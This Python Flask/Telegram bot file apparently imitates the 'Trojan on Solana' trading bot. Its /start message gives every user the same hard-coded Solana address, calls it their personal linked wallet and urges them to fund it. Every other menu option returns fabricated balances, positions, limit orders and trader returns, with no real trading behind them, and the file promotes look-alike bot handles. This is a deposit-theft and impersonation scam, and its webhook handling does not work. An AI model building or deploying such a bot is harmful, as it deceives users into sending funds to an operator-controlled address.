import logging
import os
import requests
import json
from flask import Flask, request
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Bot, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Set up logging to monitor errors and debug information
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# Flask app setup
app = Flask(__name__)

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([  
        [
            InlineKeyboardButton("Buy", callback_data="buy"),
            InlineKeyboardButton("Sell", callback_data="sell"),
        ],
        [
            InlineKeyboardButton("Positions", callback_data="positions"),
            InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
        ],
        [
            InlineKeyboardButton("Referrals", callback_data="referrals"),
            InlineKeyboardButton("Withdraw", callback_data="withdraw"),
        ],
        [
            InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
            InlineKeyboardButton("Settings", callback_data="settings"),
        ],
        [InlineKeyboardButton("Help", callback_data="help")],
    ])

# Function to handle the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    video_path = "WhatsApp Video 2024-12-03 at 12.58.12 AM.mp4"  # Relative path

    try:
        if os.path.exists(video_path):
            with open(video_path, 'rb') as video_file:
                await context.bot.send_video(
                    chat_id=update.effective_chat.id,
                    video=video_file,
                    caption="Welcome to Trojan on Solana! 🎥"
                )
        else:
            logger.error(f"Video file not found at {video_path}")
            await update.message.reply_text("Error: Welcome video not available.")
            return
    except Exception as e:
        logger.error(f"Error sending video: {e}")
        await update.message.reply_text("Error: Could not send video.")

    # Send the welcome text
    welcome_message = (
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "Here's your Solana wallet address linked to your Telegram account. "
        "Simply fund your wallet and dive into trading.\n\n"
        "Solana Wallet Address:\n"
        "AVXRzamEeoLD5vUUwdauK8928KPJ9iFuR163SYh28vy1\n\n"
        "TAP TO COPY\n\n"
        "Balance: (0.00) SOL\n\n"
        "Click on the Refresh button to update your current balance.\n\n"
        "Join our Telegram group @trojan for users of Trojan!\n\n"
        "Use the following bots for faster trading:\n"
        "@achilles_trojanbot | @odysseus_trojanbot | @Menelaus_trojanbot | "
        "@Diomedes_trojanbot | @Paris_trojanbot | @Helenus_trojanbot | @Hector_trojanbot"
    )
    await update.message.reply_text(welcome_message, reply_markup=main_menu_keyboard())

# Handlers for each menu button
async def buy_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "🔵 **Buy Tokens**\n\n"
        "Trade any token instantly. Select the token you'd like to buy and enter the amount.\n\n"
        "Your current balance: 0.00 SOL\n"
        "Example: To buy $SLND, enter the amount and confirm your purchase.\n\n"
        "💡 Pro Tip: Ensure your wallet is funded to cover the token cost and gas fees."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

async def sell_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "🔴 **Sell Tokens**\n\n"
        "Select the token you'd like to sell and enter the amount.\n\n"
        "Your current balance for $SLND: 2.419 SOL\n"
        "Example: To sell $SLND, enter the amount and confirm your sale.\n\n"
        "💡 Pro Tip: Keep an eye on market prices to sell at the best rate!"
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

async def positions_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "📊 **Open Positions**\n\n"
        "Here are your current trading positions:\n"
        "1. **$SLND** - 2.0 SOL\n"
        "2. **$BTC** - 1.5 SOL\n\n"
        "💡 Pro Tip: Monitor your positions regularly to maximize profits or minimize risks."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

async def limit_orders_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "📜 **Limit Orders**\n\n"
        "Your current limit orders:\n"
        "1. **Buy $SLND** at $0.35 - 1 SOL\n"
        "2. **Sell $SLND** at $0.40 - 2 SOL\n\n"
        "💡 Pro Tip: Limit orders let you trade at specific prices. Modify or cancel them as needed."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

async def referrals_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "🤝 **Referral Program**\n\n"
        "Invite friends to Trojan and earn rewards!\n\n"
        "🔗 Your Referral Link: https://example.com/referral\n\n"
        "💡 Pro Tip: Earn 10% of trading fees from your referred users. Share your link now!"
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

async def withdraw_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "💸 **Withdraw Funds**\n\n"
        "Withdraw your SOL balance directly to your personal wallet.\n\n"
        "Current Balance: 2.0 SOL\n\n"
        "💡 Pro Tip: Ensure you've entered the correct wallet address before confirming."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

async def copy_trade_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "📈 **Copy Trade**\n\n"
        "Follow top traders and copy their trades to maximize your profits.\n\n"
        "Top Traders:\n"
        "1. **@Trader1** - ROI: 25%\n"
        "2. **@Trader2** - ROI: 18%\n"
        "3. **@Trader3** - ROI: 30%\n\n"
        "💡 Pro Tip: Research traders' histories before copying their trades."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

async def settings_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "⚙️ **Settings**\n\n"
        "Customize your experience:\n"
        "1. **Change Language**: Select your preferred language.\n"
        "2. **Enable Notifications**: Stay updated with trading alerts.\n"
        "3. **Account Settings**: Update your account details.\n\n"
        "💡 Pro Tip: Review your settings regularly to ensure everything is up-to-date."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "❓ **Help Center**\n\n"
        "Need assistance? Here are some common FAQs:\n"
        "1. **How to deposit funds?**\n"
        "2. **How to start trading?**\n"
        "3. **How to withdraw SOL?**\n\n"
        "💬 Contact us: support@example.com\n\n"
        "💡 Pro Tip: Join our Telegram group @trojan for community support and updates!"
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

# Flask route to handle the webhook
@app.route(f'/{os.getenv("TELEGRAM_BOT_TOKEN")}', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode("UTF-8")
        logger.info(f"Received JSON data: {json_str}")
        data = json.loads(json_str)
        update = Update.de_json(data, Bot(token=os.getenv("TELEGRAM_BOT_TOKEN")))
        
        # Create the Application instance here to process updates
        application = Application.builder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
        
        # Handle the update with the necessary dispatcher
        application.update_queue.put(update)
        return 'OK'
    except Exception as e:
        logger.error(f"Error processing webhook: {e}")
        return 'Error', 500

# Set the webhook for the bot
def set_webhook():
    bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
    webhook_url = f"https://{os.getenv('RENDER_APP_URL')}/{bot_token}"  # Use Render app's URL
    
    url = f"https://api.telegram.org/bot{bot_token}/setWebhook?url={webhook_url}"
    response = requests.get(url)
    
    if response.status_code == 200:
        logger.info("Webhook successfully set.")
    else:
        logger.error(f"Failed to set webhook: {response.text}")

# Add the handlers to the application
if __name__ == "__main__":
    # Set the webhook when starting the app
    set_webhook()

    # Initialize the application and add handlers
    application = Application.builder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(buy_handler, pattern="^buy$"))
    application.add_handler(CallbackQueryHandler(sell_handler, pattern="^sell$"))
    application.add_handler(CallbackQueryHandler(positions_handler, pattern="^positions$"))
    application.add_handler(CallbackQueryHandler(limit_orders_handler, pattern="^limit_orders$"))
    application.add_handler(CallbackQueryHandler(referrals_handler, pattern="^referrals$"))
    application.add_handler(CallbackQueryHandler(withdraw_handler, pattern="^withdraw$"))
    application.add_handler(CallbackQueryHandler(copy_trade_handler, pattern="^copy_trade$"))
    application.add_handler(CallbackQueryHandler(settings_handler, pattern="^settings$"))
    application.add_handler(CallbackQueryHandler(help_handler, pattern="^help$"))
    
    # Start Flask app
    app.run(port=5000)
